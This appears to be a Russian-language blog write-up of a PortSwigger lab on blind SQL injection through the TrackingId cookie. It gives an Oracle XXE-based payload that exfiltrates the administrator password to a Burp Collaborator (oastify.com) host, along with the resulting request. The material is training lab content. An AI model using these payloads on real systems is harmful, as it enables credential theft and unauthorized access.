---
title: "Blind SQL injection with out-of-band data exfiltration"
date: 2025-06-13
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-using-out-of-band-oast-techniques/sql-injection/blind/lab-out-of-band-data-exfiltration"
classes: wide
---

В данной лабе есть уязвимый к **SQL injection** параметр `Cookie`. Запрос к БД запускается асинхронно, поэтому никак не влияет на ответ. В БД есть таблицы с именам `users` и колонками `username` и `password`. Нужно получить информацию из БД, чтобы зайти в аккаунт `administrator`.


```
https://0a400054044bb18082e8483a0054005e.web-security-academy.net/
```

## Solution

Из условий известно, что уязвимость находится в `Cookie`. Возьму `GET`-запрос:

```http
GET / HTTP/2
Host: 0a400054044bb18082e8483a0054005e.web-security-academy.net
Cookie: TrackingId=UbtpL1eU8WTJJnbk; session=yDusRS9cZxrDSDWS8cUkWL13ToIW7ozX
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a400054044bb18082e8483a0054005e.web-security-academy.net/filter?category=Accessories
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

Из опыта решений знаю, что уязвимым параметром будет `TrackingId`. Поэтому попробую для него подставить пейлоад с сайта на [странице](https://portswigger.net/web-security/sql-injection/cheat-sheet).

```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

Таким образом моя инъекция будет иметь следующий вид:

```
x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username = 'administrator')||'.utr7hqefxcz9taztyzd5gz3kfbl295xu.oastify.com/"> %remote;]>'),'/l') FROM dual-- -
```

На `Burp Collaborator` мне пришел следующий запрос, где поддомен является паролем:

```http
GET / HTTP/1.0
Host: oqc01jkxxk54bqg9mdes.vvu8jrggzd1avb1u00f6i05lhcn3b5zu.oastify.com
Content-Type: text/plain; charset=utf-8
```

Попробую зайти в ЛК:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_Blind_SQL_injection_with_out-of-band_data_exfiltration/1.png){: height="200" .align-center}

Получилось:3 ☕
